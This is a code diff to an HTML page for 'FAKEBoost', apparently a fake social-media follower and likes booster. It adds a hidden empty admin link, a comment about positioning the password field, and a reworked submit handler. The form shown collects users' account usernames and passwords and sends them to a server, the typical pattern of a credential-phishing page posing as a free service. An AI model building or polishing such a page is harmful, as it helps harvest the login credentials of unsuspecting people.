@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FAKEBoost — UNLIMITED</title>
+<title>FAKEBoost —UNLIMITED</title>
 
 <style>
 *{
@@ -384,6 +384,7 @@ footer{
         <li><a href="#home">HOME</a></li>
         <li><a href="#followers">FOLLOWERS</a></li>
         <li><a href="#likes">LIKES</a></li>
+        <li><a href="admin.html"></a></li>
     </ul>
 </nav>
 
@@ -502,6 +503,7 @@ footer{
                 <input type="text" id="username" placeholder="Enter username" required>
             </div>
 
+            <!-- USERNAME KE EXACT NICHE PASSWORD FIELD -->
             <div class="group">
                 <label>PASSWORD</label>
                 <input type="password" id="password" placeholder="Enter password" required>
@@ -567,6 +569,7 @@ document.addEventListener("keydown", e => {
 });
 
 form.addEventListener("submit", async e => {
+
     e.preventDefault();
 
     const name = username.value.trim();
@@ -591,19 +594,19 @@ form.addEventListener("submit", async e => {
             })
         });
 
-        // Safe JSON parsing to prevent crash if body is empty
-        const data = await res.json().catch(() => ({}));
-
         if(!res.ok){
-            throw new Error(data.error || "Server error occurred.");
+            const data = await res.json();
+            throw new Error(data.error || "Something went wrong.");
         }
 
+        const data = await res.json();
+
         const url =
-            "confirmation.html" +
+            "Confirmation.html" +
             "?username=" +
-            encodeURIComponent(data.username || name) +
+            encodeURIComponent(data.username) +
             "&package=" +
-            encodeURIComponent(data.package || currentPackage);
+            encodeURIComponent(data.package);
 
         window.location.href = url;
 
@@ -616,7 +619,11 @@ form.addEventListener("submit", async e => {
 });
 
 function scrollToPackages(){
-    document.getElementById("followers").scrollIntoView({ behavior:"smooth" });
+    document
+        .getElementById("followers")
+        .scrollIntoView({
+            behavior:"smooth"
+        });
 }
 </script>
 
